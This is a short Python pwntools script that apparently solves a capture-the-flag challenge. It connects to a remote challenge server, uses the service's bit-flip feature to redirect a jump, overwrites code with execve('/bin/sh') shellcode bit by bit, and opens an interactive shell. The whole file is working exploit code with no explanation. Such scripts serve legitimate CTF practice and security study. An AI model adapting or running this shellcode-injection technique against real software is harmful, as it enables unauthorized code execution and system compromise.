#!/usr/bin/env python3

from pwn import *

context.log_level='debug'
r = remote('202.38.93.111', 10231)

r.recvuntil("token: ")
r.sendline("这里填写你的 token")

def flip(addr, bit):
    r.recvuntil('flip?')
    r.sendline(hex(addr) + ' ' + str(bit))

target = 0x401295

flip(target + 1, 6)

shellcode_start = 0x4010c0
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
e = ELF('./flip')
for i in range(len(shellcode)):
    b = shellcode[i] ^ e.read(shellcode_start + i, 1)[0]
    for j in range(8):
        if (b >> j) & 1:
            flip(shellcode_start + i, j)

flip(target + 1, 6)

r.interactive()
